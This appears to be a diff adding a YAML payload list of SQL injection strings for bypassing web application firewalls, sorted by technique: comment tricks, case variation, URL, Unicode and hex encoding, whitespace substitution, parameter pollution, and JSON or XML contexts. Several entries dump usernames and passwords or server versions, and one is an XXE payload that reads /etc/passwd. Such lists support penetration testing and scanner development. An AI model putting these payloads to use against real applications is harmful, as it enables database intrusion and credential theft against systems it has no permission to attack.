@@ -1,0 +1,463 @@
+metadata:
+  type: sqli/waf_bypass
+  version: "1.0"
+  description: "WAF bypass SQL injection payloads using encoding, comments, case variations"
+  sources: ["OWASP", "SQLMap", "PayloadsAllTheThings", "SecLists"]
+
+detection_patterns:
+  - "(?i)union.*?select"
+  - "(?i)/*!\\d+.*?\\*/"
+
+payloads:
+  comment_injection:
+    - value: "'/*!50000UNION*//*!50000SELECT*/1,2,3-- -"
+      description: "MySQL version comment UNION SELECT"
+      severity: high
+      tags: [waf_bypass, comment, mysql]
+
+    - value: "'/*!50000UNION*//*!50000SELECT*/1,@@version,3-- -"
+      description: "Comment bypass version extraction"
+      severity: critical
+      tags: [waf_bypass, comment, mysql]
+
+    - value: "/*!50000UNION*//*!50000SELECT*/1,2,3"
+      description: "No quote comment bypass"
+      severity: high
+      tags: [waf_bypass, comment, mysql]
+
+    - value: "'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -"
+      description: "Spaced comment bypass"
+      severity: high
+      tags: [waf_bypass, comment, mysql]
+
+    - value: "'/*!UNION*/ /*!SELECT*/ 1,2,3-- -"
+      description: "Version-less comment bypass"
+      severity: high
+      tags: [waf_bypass, comment, mysql]
+
+    - value: "'/*!12345UNION*/ /*!12345SELECT*/ 1,2,3-- -"
+      description: "Arbitrary version comment"
+      severity: high
+      tags: [waf_bypass, comment, mysql]
+
+    - value: "'/*!50000UniOn*//*!50000SeLeCt*/ 1,2,3-- -"
+      description: "Comment + case variation"
+      severity: high
+      tags: [waf_bypass, comment, case, mysql]
+
+    - value: "'/**/UNION/**/SELECT/**/1,2,3-- -"
+      description: "Multiline comment UNION SELECT"
+      severity: high
+      tags: [waf_bypass, comment]
+
+    - value: "'/**/union/**/select/**/1,2,3-- -"
+      description: "Multiline comment lowercase"
+      severity: high
+      tags: [waf_bypass, comment]
+
+    - value: "'/**//**/UNION/**//**/SELECT/**//**/1,2,3-- -"
+      description: "Double comment bypass"
+      severity: high
+      tags: [waf_bypass, comment]
+
+    - value: "UNI/**/ON SEL/**/ECT 1,2,3"
+      description: "Inline comment keyword split"
+      severity: high
+      tags: [waf_bypass, comment]
+
+    - value: "' UNI/**/ON SEL/**/ECT 1,2,3-- -"
+      description: "Keyword split with prefix"
+      severity: high
+      tags: [waf_bypass, comment]
+
+    - value: "' UNION%0ASELECT%0A1,2,3-- -"
+      description: "Newline between keywords"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "' UNION%0DSELECT%0D1,2,3-- -"
+      description: "Carriage return between keywords"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "' UNION%09SELECT%091,2,3-- -"
+      description: "Tab between keywords"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "' UNION%0BSELECT%0B1,2,3-- -"
+      description: "Vertical tab between keywords"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "' UNION%0CSELECT%0C1,2,3-- -"
+      description: "Form feed between keywords"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "' UNION%A0SELECT%A01,2,3-- -"
+      description: "Non-breaking space"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+  case_variation:
+    - value: "' UnIoN sElEcT 1,2,3-- -"
+      description: "Random case UNION SELECT"
+      severity: high
+      tags: [waf_bypass, case]
+
+    - value: "' UNION select 1,2,3-- -"
+      description: "Mixed case UNION select"
+      severity: high
+      tags: [waf_bypass, case]
+
+    - value: "' union SELECT 1,2,3-- -"
+      description: "Mixed case union SELECT"
+      severity: high
+      tags: [waf_bypass, case]
+
+    - value: "' uNiOn SeLeCt 1,2,3-- -"
+      description: "Alternating case"
+      severity: high
+      tags: [waf_bypass, case]
+
+    - value: "' UNION SEL/**/ECT 1,2,3-- -"
+      description: "Case + comment combo"
+      severity: high
+      tags: [waf_bypass, case, comment]
+
+    - value: "' UNIunionON SELselectECT 1,2,3-- -"
+      description: "Double keyword bypass"
+      severity: high
+      tags: [waf_bypass, case, double_keyword]
+
+    - value: "' UNunionION SELselectECT 1,2,3-- -"
+      description: "Nested keyword bypass"
+      severity: high
+      tags: [waf_bypass, case, double_keyword]
+
+    - value: "' sElEcT 1,2,3 fRoM users-- -"
+      description: "Full query case variation"
+      severity: high
+      tags: [waf_bypass, case]
+
+    - value: "' uNiOn aLl sElEcT 1,2,3-- -"
+      description: "UNION ALL case variation"
+      severity: high
+      tags: [waf_bypass, case]
+
+    - value: "' OR 1=1-- -"
+      description: "Simple OR bypass"
+      severity: high
+      tags: [waf_bypass, case]
+
+    - value: "' oR 1=1-- -"
+      description: "Lowercase OR"
+      severity: high
+      tags: [waf_bypass, case]
+
+    - value: "' Or 1=1-- -"
+      description: "Title case OR"
+      severity: high
+      tags: [waf_bypass, case]
+
+  encoding:
+    - value: "%27%20UNION%20SELECT%201,2,3--%20-"
+      description: "URL encoded single quote and spaces"
+      severity: high
+      tags: [waf_bypass, url_encoding]
+
+    - value: "%2527%2520UNION%2520SELECT%25201,2,3--%2520-"
+      description: "Double URL encoded"
+      severity: high
+      tags: [waf_bypass, double_url_encoding]
+
+    - value: "%u0027%20UNION%20SELECT%201,2,3--"
+      description: "Unicode quote %u0027"
+      severity: high
+      tags: [waf_bypass, unicode]
+
+    - value: "%u02b9 UNION SELECT 1,2,3--"
+      description: "Unicode alternative quote"
+      severity: high
+      tags: [waf_bypass, unicode]
+
+    - value: "%ef%bc%87 UNION SELECT 1,2,3--"
+      description: "Fullwidth apostrophe"
+      severity: high
+      tags: [waf_bypass, unicode, fullwidth]
+
+    - value: "&#39; UNION SELECT 1,2,3--"
+      description: "HTML entity apostrophe"
+      severity: high
+      tags: [waf_bypass, html_entity]
+
+    - value: "&#x27; UNION SELECT 1,2,3--"
+      description: "Hex HTML entity apostrophe"
+      severity: high
+      tags: [waf_bypass, html_entity]
+
+    - value: "' /*!50000UNION*/ /*!50000SELECT*/ %31,%32,%33-- -"
+      description: "Mixed comment + URL encoding"
+      severity: high
+      tags: [waf_bypass, mixed_encoding]
+
+    - value: "0x2720554e494f4e2053454c45435420312c322c332d2d"
+      description: "Hex encoded full payload"
+      severity: high
+      tags: [waf_bypass, hex_encoding]
+
+    - value: "CHAR(39,32,85,78,73,79,78,32,83,69,76,69,67,84,32,49,44,50,44,51)"
+      description: "CHAR function encoding"
+      severity: high
+      tags: [waf_bypass, char_encoding]
+
+    - value: "' UNiOn/**/SeLeCt/**/1,2,3-- -"
+      description: "Combined case + comment"
+      severity: high
+      tags: [waf_bypass, mixed]
+
+    - value: "%27%20/*!50000UNION*/%20/*!50000SELECT*/%201,2,3--%20-"
+      description: "URL encoding + MySQL comments"
+      severity: high
+      tags: [waf_bypass, mixed]
+
+  whitespace_substitution:
+    - value: "'%09UNION%09SELECT%091,2,3-- -"
+      description: "Tab whitespace"
+      severity: high
+      tags: [waf_bypass, whitespace, tab]
+
+    - value: "'%0AUNION%0ASELECT%0A1,2,3-- -"
+      description: "Newline whitespace"
+      severity: high
+      tags: [waf_bypass, whitespace, newline]
+
+    - value: "'%0DUNION%0DSELECT%0D1,2,3-- -"
+      description: "Carriage return whitespace"
+      severity: high
+      tags: [waf_bypass, whitespace, cr]
+
+    - value: "'%0BUNION%0BSELECT%0B1,2,3-- -"
+      description: "Vertical tab whitespace"
+      severity: high
+      tags: [waf_bypass, whitespace, vtab]
+
+    - value: "'%0CUNION%0CSELECT%0C1,2,3-- -"
+      description: "Form feed whitespace"
+      severity: high
+      tags: [waf_bypass, whitespace, formfeed]
+
+    - value: "'%A0UNION%A0SELECT%A01,2,3-- -"
+      description: "Non-breaking space"
+      severity: high
+      tags: [waf_bypass, whitespace, nbsp]
+
+    - value: "'%0D%0AUNION%0D%0ASELECT%0D%0A1,2,3-- -"
+      description: "CRLF whitespace"
+      severity: high
+      tags: [waf_bypass, whitespace, crlf]
+
+    - value: "'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3-- -"
+      description: "Comment as whitespace"
+      severity: high
+      tags: [waf_bypass, comment]
+
+    - value: "'+UNION+SELECT+1,2,3-- -"
+      description: "Plus sign whitespace"
+      severity: high
+      tags: [waf_bypass, whitespace, plus]
+
+    - value: "'/**/UNION/**/SELECT/**/1,2,3-- -"
+      description: "Empty comment whitespace"
+      severity: high
+      tags: [waf_bypass, comment]
+
+  hpp:
+    - value: "id=1&id=1' UNION SELECT 1,2,3-- -"
+      description: "HTTP Parameter Pollution"
+      severity: high
+      tags: [waf_bypass, hpp]
+
+    - value: "id=1' UNION SELECT 1,2,3-- -&id=1"
+      description: "HPP payload first"
+      severity: high
+      tags: [waf_bypass, hpp]
+
+    - value: "id=1&id=' UNION SELECT 1,2,3-- -"
+      description: "HPP second param injection"
+      severity: high
+      tags: [waf_bypass, hpp]
+
+    - value: "id=1%00&id=' UNION SELECT 1,2,3-- -"
+      description: "HPP with null byte"
+      severity: high
+      tags: [waf_bypass, hpp, null_byte]
+
+    - value: "id=1'%20OR%20'1'='1&id=2"
+      description: "HPP OR tautology"
+      severity: high
+      tags: [waf_bypass, hpp]
+
+  json_xml_context:
+    - value: "{\"id\": \"1' UNION SELECT 1,2,3-- -\"}"
+      description: "JSON context injection"
+      severity: high
+      tags: [waf_bypass, json]
+
+    - value: "{\"id\": \"1' OR '1'='1\"}"
+      description: "JSON OR bypass"
+      severity: high
+      tags: [waf_bypass, json]
+
+    - value: "{\"query\": \"1 UNION SELECT 1,@@version,3\"}"
+      description: "JSON UNION injection"
+      severity: high
+      tags: [waf_bypass, json]
+
+    - value: "<id>1' UNION SELECT 1,2,3--</id>"
+      description: "XML context injection"
+      severity: high
+      tags: [waf_bypass, xml]
+
+    - value: "<search>' OR '1'='1</search>"
+      description: "XML OR bypass"
+      severity: high
+      tags: [waf_bypass, xml]
+
+    - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><id>&xxe;</id>"
+      description: "XML XXE + SQLi combo"
+      severity: critical
+      tags: [waf_bypass, xml, xxe]
+
+  chunked_bypass:
+    - value: "1'\r\nUNION\r\nSELECT\r\n1,2,3-- -"
+      description: "Chunked transfer injection"
+      severity: high
+      tags: [waf_bypass, chunked]
+
+    - value: "1'\r\n\r\nUNION SELECT 1,2,3-- -"
+      description: "Double CRLF chunk"
+      severity: high
+      tags: [waf_bypass, chunked]
+
+  advanced_bypass:
+    - value: "' OR 1=1 LIMIT 1-- -"
+      description: "LIMIT clause bypass"
+      severity: high
+      tags: [waf_bypass, advanced]
+
+    - value: "' UNION SELECT 1,2,3 LIMIT 0,1-- -"
+      description: "UNION with LIMIT"
+      severity: high
+      tags: [waf_bypass, advanced]
+
+    - value: "' AND 1=1 UNION SELECT 1,2,3-- -"
+      description: "Boolean + UNION combo"
+      severity: high
+      tags: [waf_bypass, advanced]
+
+    - value: "' OR '1'='1' UNION SELECT 1,2,3-- -"
+      description: "OR + UNION combo"
+      severity: high
+      tags: [waf_bypass, advanced]
+
+    - value: "1' AND '1'='1' UNION SELECT 1,@@version,3-- -"
+      description: "Boolean confirm + UNION"
+      severity: critical
+      tags: [waf_bypass, advanced]
+
+    - value: "' UNION SELECT 1,2,3 FROM (SELECT 1)a-- -"
+      description: "Derived table bypass"
+      severity: high
+      tags: [waf_bypass, advanced]
+
+    - value: "' WHERE 1=1 UNION SELECT 1,2,3-- -"
+      description: "WHERE context bypass"
+      severity: high
+      tags: [waf_bypass, advanced]
+
+    - value: "1;SELECT 1,2,3-- -"
+      description: "Semicolon stacked"
+      severity: high
+      tags: [waf_bypass, stacked]
+
+    - value: "1'%0aOR%0a1=1-- -"
+      description: "Newline OR bypass"
+      severity: high
+      tags: [waf_bypass, whitespace]
+
+    - value: "'||1=1-- -"
+      description: "Pipe concatenation OR"
+      severity: high
+      tags: [waf_bypass, concatenation]
+
+    - value: "' OR 1 LIKE 1-- -"
+      description: "LIKE bypass"
+      severity: high
+      tags: [waf_bypass, like]
+
+    - value: "' OR 1 BETWEEN 0 AND 2-- -"
+      description: "BETWEEN bypass"
+      severity: high
+      tags: [waf_bypass, between]
+
+    - value: "' OR 1 IN (1)-- -"
+      description: "IN clause bypass"
+      severity: high
+      tags: [waf_bypass, in_clause]
+
+    - value: "' AND (SELECT 1)=1-- -"
+      description: "Subquery comparison"
+      severity: high
+      tags: [waf_bypass, subquery]
+
+    - value: "' OR ASCII(SUBSTRING('a',1,1))=97-- -"
+      description: "ASCII function bypass"
+      severity: high
+      tags: [waf_bypass, ascii]
+
+    - value: "CONVERT(int,(SELECT @@version))"
+      description: "CONVERT function bypass"
+      severity: critical
+      tags: [waf_bypass, convert]
+
+    - value: "CAST((SELECT @@version) AS int)"
+      description: "CAST function bypass"
+      severity: critical
+      tags: [waf_bypass, cast]
+
+    - value: "' AND 1=1 ORDER BY 1-- -"
+      description: "Boolean + ORDER BY"
+      severity: high
+      tags: [waf_bypass, order_by]
+
+    - value: "-1 UNION SELECT 1,2,3,4,5-- -"
+      description: "Negative ID UNION"
+      severity: high
+      tags: [waf_bypass, negative_id]
+
+    - value: "0 UNION SELECT 1,2,3-- -"
+      description: "Zero ID UNION"
+      severity: high
+      tags: [waf_bypass, zero_id]
+
+    - value: "99999 UNION SELECT 1,2,3-- -"
+      description: "Large ID UNION"
+      severity: high
+      tags: [waf_bypass, large_id]
+
+    - value: "1' UNION SELECT 1,2,3-- -"
+      description: "String context UNION"
+      severity: high
+      tags: [waf_bypass, string_context]
+
+    - value: "admin'/**/UNION/**/SELECT/**/1,@@version,3/**/FROM/**/users-- -"
+      description: "Full comment-bypassed extraction"
+      severity: critical
+      tags: [waf_bypass, advanced]
+
+    - value: "' /*!50000UNION*/ /*!50000SELECT*/ 1,group_concat(username,0x3a,password),3 FROM users-- -"
+      description: "MySQL comment data dump"
+      severity: critical
+      tags: [waf_bypass, advanced, mysql]
